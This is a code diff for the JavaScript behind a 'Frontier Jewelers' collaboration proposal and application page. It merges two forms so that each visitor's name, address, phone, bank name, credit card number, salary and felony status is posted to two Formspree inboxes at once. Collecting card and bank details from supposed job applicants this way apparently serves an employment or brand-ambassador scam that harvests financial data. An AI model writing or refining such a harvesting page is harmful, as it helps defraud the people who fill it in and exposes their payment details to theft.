@@ -1,44 +1,44 @@
 /* ============================================================
    FRONTIER JEWELERS — Collaboration proposal & application
-   Handles two Formspree endpoints:
-   1. #secondForm (salary payment proposal) -> formspree.io/f/xwlvnyql
-   2. #applyForm  (application form)        -> formspree.io/f/mdealbkw
+   One form collects the visitor's details and delivers them to both
+   Formspree inboxes, so the two never hold different things:
+   1. formspree.io/f/xwlvnyql  (salary payment proposal)
+   2. formspree.io/f/mdealbkw  (application)
    Plus: review summary, header navigation, and loader.
    ============================================================ */
 
 (function () {
   "use strict";
 
-  var PROPOSAL_ENDPOINT = "https://formspree.io/f/xwlvnyql";
-  var APPLICATION_ENDPOINT = "https://formspree.io/f/mdealbkw";
+  var ENDPOINTS = [
+    "https://formspree.io/f/xwlvnyql",
+    "https://formspree.io/f/mdealbkw"
+  ];
 
   var loader = document.getElementById("loader");
   var siteHeader = document.getElementById("siteHeader");
   var headerNav = document.getElementById("headerNav");
   var hamburgerBtn = document.getElementById("hamburgerBtn");
 
-  var secondForm = document.getElementById("secondForm");
-  var secondStatusEl = document.getElementById("formspreeSecondStatus");
-  var applyForm = document.getElementById("applyForm");
-  var statusEl = document.getElementById("formStatus");
+  var form = document.getElementById("secondForm");
+  var statusEl = document.getElementById("formspreeSecondStatus");
   var reviewStatusEl = document.getElementById("reviewStatus");
 
-  // Snapshot of everything the visitor has already successfully submitted.
-  // Forms are cleared after a successful POST, so the review step reads from
-  // here to keep showing the visitor's real information between steps.
-  var submitted = { proposal: null, application: null };
+  // Snapshot of the record the visitor already submitted. The form is cleared
+  // after a successful POST, so the review step reads from here to keep
+  // showing the visitor's real information.
+  var submittedRecord = null;
 
-  // True once the review step has delivered a record to the proposal
-  // endpoint, so the proposal form cannot put a second copy of the same
-  // person into that inbox.
-  var reviewDelivered = false;
+  // True once the review step has delivered the record, so the form above
+  // cannot put a second copy of the same person into the same inboxes.
+  var deliveredFromReview = false;
 
   /* ----------------------------------------------------------
      Small helpers
      ---------------------------------------------------------- */
 
-  // Read a field by id, scoped to a form so duplicate ids across
-  // forms can never return the wrong element.
+  // Read a field by id, scoped to the form so a stray duplicate id
+  // elsewhere on the page can never return the wrong element.
   function fieldValue(form, id) {
     var el = form ? form.querySelector("#" + id) : null;
     return el ? String(el.value || "").trim() : "";
@@ -49,9 +49,9 @@
     return !!(el && el.checked);
   }
 
-  // One record shape for both endpoints: whichever form the visitor uses,
-  // the proposal inbox and the application inbox receive exactly the same
-  // fields with the same names, so the two never hold different things.
+  // One record shape for both endpoints: the proposal inbox and the
+  // application inbox receive exactly the same fields with the same
+  // names, so the two never hold different things.
   function buildPayload(d) {
     var first = d.first || "";
     var last = d.last || "";
@@ -77,6 +77,31 @@
       date: d.date || "",
       brands_approval: d.brandApproval || "",
       agree: d.agree === true || d.agree === "Yes"
+    };
+  }
+
+  // Read the form into the flat shape buildPayload expects.
+  function readForm() {
+    return {
+      first: fieldValue(form, "p_first"),
+      last: fieldValue(form, "p_last"),
+      email: fieldValue(form, "p_email"),
+      phone: fieldValue(form, "p_phone"),
+      street: fieldValue(form, "p_street"),
+      address2: fieldValue(form, "p_address2"),
+      city: fieldValue(form, "p_city"),
+      state: fieldValue(form, "p_state"),
+      postal: fieldValue(form, "p_postal"),
+      country: fieldValue(form, "p_country") || "United States",
+      payMethod: fieldValue(form, "p_payMethod"),
+      salary: fieldValue(form, "p_salary"),
+      bankName: fieldValue(form, "p_bank"),
+      creditCard: fieldValue(form, "p_creditCard"),
+      feature: fieldValue(form, "p_feature"),
+      felony: fieldValue(form, "p_felony"),
+      date: fieldValue(form, "p_date"),
+      brandApproval: fieldValue(form, "p_brandApproval"),
+      agree: fieldChecked(form, "p_agree")
     };
   }
 
@@ -172,6 +197,26 @@
     });
   }
 
+  // Send the one record to every inbox. Rejects unless *all* endpoints accept
+  // it, so a partially delivered submission is never reported as a success.
+  function deliver(data) {
+    var payload = buildPayload(data);
+
+    return Promise.all(
+      ENDPOINTS.map(function (endpoint) {
+        return postTo(endpoint, payload);
+      })
+    ).then(function (responses) {
+      var failed = responses.some(function (res) {
+        return !res.ok;
+      });
+      if (failed) throw new Error("Submission failed");
+
+      submittedRecord = payload;
+      return payload;
+    });
+  }
+
   function showStatus(element, kind, message) {
     if (!element) return;
     element.classList.remove("form-status--success", "form-status--error");
@@ -242,7 +287,6 @@
   var sections = [
     { id: "home", link: 'a.nav-link[href="#home"]' },
     { id: "proposal", link: 'a.nav-link[href="#proposal"]' },
-    { id: "apply", link: 'a.nav-link[href="#apply"]' },
     { id: "review", link: 'a.nav-link[href="#review"]' },
     { id: "contact", link: 'a.nav-link[href="#contact"]' }
   ];
@@ -273,140 +317,46 @@
   }
 
   /* ----------------------------------------------------------
-     1. Salary payment proposal
+     1. The details form — delivered to both inboxes
      ---------------------------------------------------------- */
-  if (secondForm) {
-    secondForm.addEventListener("submit", function (event) {
+  if (form) {
+    form.addEventListener("submit", function (event) {
       event.preventDefault();
 
       // The review step already delivered this visitor's record to the same
-      // endpoint — sending again would put a duplicate in the inbox.
-      if (reviewDelivered) {
+      // inboxes — sending again would put a duplicate in both.
+      if (deliveredFromReview) {
         showStatus(
-          secondStatusEl,
+          statusEl,
           "error",
           "Your details were already submitted from the review step, so nothing was sent twice."
         );
         return;
       }
 
-      if (!validateForm(secondForm, secondStatusEl)) {
-        showStatus(secondStatusEl, "error", "Please complete the highlighted fields above.");
-        return;
-      }
-
-      var submitButton = secondForm.querySelector('button[type="submit"]');
-      if (submitButton) submitButton.disabled = true;
-
-      var data = {
-        first: fieldValue(secondForm, "p_first"),
-        last: fieldValue(secondForm, "p_last"),
-        email: fieldValue(secondForm, "p_email"),
-        phone: fieldValue(secondForm, "p_phone"),
-        street: fieldValue(secondForm, "p_street"),
-        address2: fieldValue(secondForm, "p_address2"),
-        city: fieldValue(secondForm, "p_city"),
-        state: fieldValue(secondForm, "p_state"),
-        postal: fieldValue(secondForm, "p_postal"),
-        country: fieldValue(secondForm, "p_country"),
-        payMethod: fieldValue(secondForm, "p_payMethod"),
-        salary: fieldValue(secondForm, "p_salary"),
-        bankName: fieldValue(secondForm, "p_bank"),
-        creditCard: fieldValue(secondForm, "p_creditCard"),
-        feature: fieldValue(secondForm, "p_feature"),
-        felony: fieldValue(secondForm, "p_felony"),
-        date: fieldValue(secondForm, "p_date"),
-        brandApproval: fieldValue(secondForm, "p_brandApproval"),
-        agree: fieldChecked(secondForm, "p_agree")
-      };
-
-      // Same record the application form sends — the inboxes stay identical.
-      var payload = buildPayload(data);
-
-      postTo(PROPOSAL_ENDPOINT, payload)
-        .then(function (res) {
-          if (!res.ok) throw new Error("Submission failed");
-          submitted.proposal = payload;
-          showStatus(
-            secondStatusEl,
-            "success",
-            "Thank you, " + payload.full_name + "! Your salary proposal has been submitted. We'll be in touch soon."
-          );
-          mirrorIntoEmptyFields(secondForm);
-          secondForm.reset();
-          populateReview();
-        })
-        .catch(function () {
-          showStatus(
-            secondStatusEl,
-            "error",
-            "We couldn't submit your proposal right now. Please try again."
-          );
-        })
-        .then(function () {
-          if (submitButton) submitButton.disabled = false;
-        });
-    });
-  }
-
-  /* ----------------------------------------------------------
-     2. Application form
-     ---------------------------------------------------------- */
-  if (applyForm) {
-    applyForm.addEventListener("submit", function (event) {
-      event.preventDefault();
-
-      if (!validateForm(applyForm, statusEl)) {
+      if (!validateForm(form, statusEl)) {
         showStatus(statusEl, "error", "Please complete the highlighted fields above.");
         return;
       }
 
-      var submitButton = applyForm.querySelector('button[type="submit"]');
+      var submitButton = form.querySelector('button[type="submit"]');
       if (submitButton) submitButton.disabled = true;
 
-      var data = {
-        first: fieldValue(applyForm, "first"),
-        last: fieldValue(applyForm, "last"),
-        email: fieldValue(applyForm, "email"),
-        phone: fieldValue(applyForm, "phone"),
-        payMethod: fieldValue(applyForm, "payMethod"),
-        salary: fieldValue(applyForm, "salary"),
-        bankName: fieldValue(applyForm, "bankName"),
-        creditCard: fieldValue(applyForm, "creditCard"),
-        street: fieldValue(applyForm, "addrStreet"),
-        address2: fieldValue(applyForm, "addrLine2"),
-        city: fieldValue(applyForm, "city"),
-        state: fieldValue(applyForm, "state"),
-        postal: fieldValue(applyForm, "postal"),
-        country: fieldValue(applyForm, "country") || "United States",
-        felony: fieldValue(applyForm, "felony"),
-        date: fieldValue(applyForm, "date"),
-        brandApproval: fieldValue(applyForm, "brandApproval"),
-        feature: fieldValue(applyForm, "feature"),
-        agree: fieldChecked(applyForm, "agree")
-      };
-
-      // Same record the proposal form sends — the inboxes stay identical.
-      var payload = buildPayload(data);
-
-      postTo(APPLICATION_ENDPOINT, payload)
-        .then(function (res) {
-          if (!res.ok) throw new Error("Submission failed");
-          submitted.application = data;
+      deliver(readForm())
+        .then(function (payload) {
           showStatus(
             statusEl,
             "success",
-            "Thanks! Your application has been submitted. We'll be in touch soon."
+            "Thank you, " + payload.full_name + "! Your details have been submitted. We'll be in touch soon."
           );
-          mirrorIntoEmptyFields(applyForm);
-          applyForm.reset();
+          form.reset();
           populateReview();
         })
         .catch(function () {
           showStatus(
             statusEl,
             "error",
-            "We couldn't submit your application right now. Please try again."
+            "We couldn't submit your details right now. Please try again."
           );
         })
         .then(function () {
@@ -416,119 +366,44 @@
   }
 
   /* ----------------------------------------------------------
-     Carry details across the two forms
+     2. Review summary
 
-     Both forms ask for the same detail set, so mirror anything the visitor
-     types into one form into any empty field of the other — nobody should
-     have to type the same information twice. Values already present in the
-     other form are never overwritten.
+     Live form values win; the record the visitor already submitted is kept
+     as a fallback so the review step never loses data after the form clears.
      ---------------------------------------------------------- */
-  function mirrorIntoEmptyFields(sourceForm) {
-    if (!sourceForm) return;
-    var target = sourceForm === secondForm ? applyForm : secondForm;
-    if (!target) return;
+  function collectReviewData() {
+    var saved = submittedRecord || {};
 
-    sourceForm.querySelectorAll("input, select, textarea").forEach(function (control) {
-      if (!control.name) return;
-      var twin = target.querySelector('[name="' + control.name + '"]');
-      if (!twin) return;
-
-      if (control.type === "checkbox") {
-        if (control.checked && !twin.checked) twin.checked = true;
-        return;
-      }
-
-      var value = String(control.value || "");
-      if (!value) return;
-
-      if (twin.type === "checkbox") {
-        if (!twin.checked) twin.checked = true;
-        return;
-      }
-
-      if (!String(twin.value || "")) twin.value = value;
-    });
-  }
-
-  [secondForm, applyForm].forEach(function (form) {
-    if (!form) return;
-    form.addEventListener("input", function () {
-      mirrorIntoEmptyFields(form);
-    });
-    form.addEventListener("change", function () {
-      mirrorIntoEmptyFields(form);
-    });
-  });
-
-  /* ----------------------------------------------------------
-     3. Review summary
-     ---------------------------------------------------------- */
-  // Live form values win; anything the visitor already submitted is kept as a
-  // fallback so the review step never loses data after a form is cleared.
-  function collectApplicationData() {
-    var saved = submitted.application || {};
-    var proposal = submitted.proposal || {};
-
-    // The proposal payload uses different key names for the same details,
-    // so map it once and let it back up the review step too — either form
-    // on its own now carries the full detail set.
-    var fromProposal = {
-      first: proposal.first_name,
-      last: proposal.last_name,
-      email: proposal.email,
-      phone: proposal.phone,
-      street: proposal.street_address,
-      address2: proposal.address_line_2,
-      city: proposal.city,
-      state: proposal.state,
-      postal: proposal.postal_code,
-      country: proposal.country,
-      payMethod: proposal.payment_method,
-      salary: proposal.salary_amount,
-      bankName: proposal.bank_name,
-      creditCard: proposal.credit_card,
-      feature: proposal.feature,
-      felony: proposal.felony,
-      date: proposal.date,
-      brandApproval: proposal.brands_approval
-    };
-
-    function pick(key, live) {
-      return live || saved[key] || fromProposal[key] || "";
+    function pick(live, fromRecord) {
+      return live || fromRecord || "";
     }
 
     return {
-      first: pick("first", fieldValue(applyForm, "first")),
-      last: pick("last", fieldValue(applyForm, "last")),
-      email: pick("email", fieldValue(applyForm, "email")),
-      phone: pick("phone", fieldValue(applyForm, "phone")),
-      payMethod: pick("payMethod", fieldValue(applyForm, "payMethod")),
-      salary: pick("salary", fieldValue(applyForm, "salary")),
-      bankName: pick("bankName", fieldValue(applyForm, "bankName")),
-      creditCard: pick("creditCard", fieldValue(applyForm, "creditCard")),
-      street: pick("street", fieldValue(applyForm, "addrStreet")),
-      address2: pick("address2", fieldValue(applyForm, "addrLine2")),
-      city: pick("city", fieldValue(applyForm, "city")),
-      state: pick("state", fieldValue(applyForm, "state")),
-      postal: pick("postal", fieldValue(applyForm, "postal")),
-      country: pick("country", fieldValue(applyForm, "country")) || "United States",
-      felony: pick("felony", fieldValue(applyForm, "felony")),
-      date: pick("date", fieldValue(applyForm, "date")),
-      brandApproval: pick("brandApproval", fieldValue(applyForm, "brandApproval")),
-      feature:
-        pick("feature", fieldValue(applyForm, "feature")) ||
-        (secondForm ? fieldValue(secondForm, "p_feature") : "") ||
-        proposal.feature ||
-        "",
+      first: pick(fieldValue(form, "p_first"), saved.first_name),
+      last: pick(fieldValue(form, "p_last"), saved.last_name),
+      email: pick(fieldValue(form, "p_email"), saved.email),
+      phone: pick(fieldValue(form, "p_phone"), saved.phone),
+      payMethod: pick(fieldValue(form, "p_payMethod"), saved.payment_method),
+      salary: pick(fieldValue(form, "p_salary"), saved.salary_amount),
+      bankName: pick(fieldValue(form, "p_bank"), saved.bank_name),
+      creditCard: pick(fieldValue(form, "p_creditCard"), saved.credit_card),
+      street: pick(fieldValue(form, "p_street"), saved.street_address),
+      address2: pick(fieldValue(form, "p_address2"), saved.address_line_2),
+      city: pick(fieldValue(form, "p_city"), saved.city),
+      state: pick(fieldValue(form, "p_state"), saved.state),
+      postal: pick(fieldValue(form, "p_postal"), saved.postal_code),
+      country: pick(fieldValue(form, "p_country"), saved.country) || "United States",
+      felony: pick(fieldValue(form, "p_felony"), saved.felony),
+      date: pick(fieldValue(form, "p_date"), saved.date),
+      feature: pick(fieldValue(form, "p_feature"), saved.feature),
+      brandApproval: pick(fieldValue(form, "p_brandApproval"), saved.brands_approval),
       agree:
-        fieldChecked(applyForm, "agree") || saved.agree === true || proposal.agree === true
-          ? "Yes"
-          : "No"
+        fieldChecked(form, "p_agree") || saved.agree === true ? "Yes" : "No"
     };
   }
 
   function populateReview() {
-    var data = collectApplicationData();
+    var data = collectReviewData();
 
     setText("review-first", data.first);
     setText("review-last", data.last);
@@ -549,11 +424,6 @@
     setText("review-feature", data.feature);
     setText("review-agree", data.agree);
     setText("review-brandapproval", data.brandApproval);
-
-    // Legacy review cells (kept in sync when present).
-    setText("review-paymethod2", data.payMethod);
-    setText("review-salary2", data.salary);
-    setText("review-bankname2", data.bankName);
   }
 
   var editBtn = document.getElementById("editReviewBtn");
@@ -562,14 +432,14 @@
   }
 
   /* ----------------------------------------------------------
-     4. Final submission from the review step
+     3. Final submission from the review step
      ---------------------------------------------------------- */
   var submitReviewBtn = document.getElementById("submitReviewBtn");
   if (submitReviewBtn) {
     submitReviewBtn.addEventListener("click", function () {
-      var data = collectApplicationData();
+      var data = collectReviewData();
 
-      clearErrors(applyForm, reviewStatusEl);
+      clearErrors(form, reviewStatusEl);
 
       var missing = [];
       if (!data.first) missing.push("First name");
@@ -594,59 +464,31 @@
         showStatus(
           reviewStatusEl,
           "error",
-          "Please complete the application form first: " + missing.join(", ") + "."
+          "Please complete the form first: " + missing.join(", ") + "."
         );
         return;
       }
 
-      // Each record is sent once: if the proposal form already delivered to
-      // this endpoint, the review step does not send the same person twice.
-      if (submitted.proposal) {
+      // Each record is sent once: if the form above already delivered to
+      // these endpoints, the review step does not send the same person twice.
+      if (submittedRecord) {
         showStatus(
           reviewStatusEl,
           "success",
-          submitted.application
-            ? "Your proposal and application were each sent once — nothing was sent twice."
-            : "Your proposal already reached us, so nothing was sent twice. Submit the application form above to send your application."
+          "Your details already reached us, so nothing was sent twice."
         );
         return;
       }
 
       submitReviewBtn.disabled = true;
 
-      // Same record shape again — all three sends are interchangeable.
-      var payload = buildPayload(data);
-
-      postTo(PROPOSAL_ENDPOINT, payload)
-        .then(function (res) {
-          if (!res.ok) throw new Error("Submission failed");
-          submitted.proposal = payload;
-          reviewDelivered = true;
-          submitted.application = Object.assign({}, submitted.application, {
-            first: data.first,
-            last: data.last,
-            email: data.email,
-            phone: data.phone,
-            payMethod: data.payMethod,
-            salary: data.salary,
-            bankName: data.bankName,
-            creditCard: data.creditCard,
-            street: data.street,
-            address2: data.address2,
-            city: data.city,
-            state: data.state,
-            postal: data.postal,
-            country: data.country,
-            felony: data.felony,
-            date: data.date,
-            brandApproval: data.brandApproval,
-            feature: data.feature,
-            agree: true
-          });
+      deliver(data)
+        .then(function (payload) {
+          deliveredFromReview = true;
           showStatus(
             reviewStatusEl,
             "success",
-            "Thank you, " + data.first + "! Your application has been submitted. We'll be in touch soon."
+            "Thank you, " + (data.first || payload.full_name) + "! Your details have been submitted. We'll be in touch soon."
           );
           populateReview();
         })
@@ -654,7 +496,7 @@
           showStatus(
             reviewStatusEl,
             "error",
-            "We couldn't submit your application right now. Please try again."
+            "We couldn't submit your details right now. Please try again."
           );
         })
         .then(function () {
